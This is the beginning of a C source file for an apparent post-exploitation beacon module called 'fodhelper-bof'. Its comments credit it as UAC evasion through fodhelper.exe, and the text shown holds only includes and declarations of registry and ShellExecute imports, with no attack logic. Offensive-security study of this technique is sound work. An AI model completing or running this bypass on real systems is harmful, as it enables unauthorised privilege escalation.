/*
fodhelper-bof modified by @mooolight

Credits:
 * - @cocomelonc  * Malware Development for Ethical Hackers => hack.c - UAC evasion using fodhelper.exe
 * - VX-UG : Vx-API
 */

#include <windows.h>
#include <stdio.h>
#include <shellapi.h>
#include <stdlib.h>
#include "..\beacon.h"
#include "..\bofdefs.h"


// Advapi32
WINADVAPI LSTATUS WINAPI ADVAPI32$RegCreateKeyExA(HKEY ,LPCSTR ,DWORD ,LPSTR ,DWORD ,REGSAM ,const LPSECURITY_ATTRIBUTES ,PHKEY ,LPDWORD);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegSetValueExA(HKEY,LPCSTR,DWORD,DWORD,const BYTE *,DWORD);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegDeleteKeyExW(HKEY ,LPCSTR ,REGSAM ,DWORD);
WINADVAPI LSTATUS WINAPI ADVAPI32$RegDeleteKeyExA(HKEY,LPCSTR,REGSAM,DWORD);


// Kernel32
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);

// Shell32
WINBASEAPI BOOL SHELL32$ShellExecuteExA(SHELLEXECUTEINFOA *);

// Msvcrt
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *);
WINBASEAPI CHAR* __cdecl MSVCRT$strcat(char *,const char *);

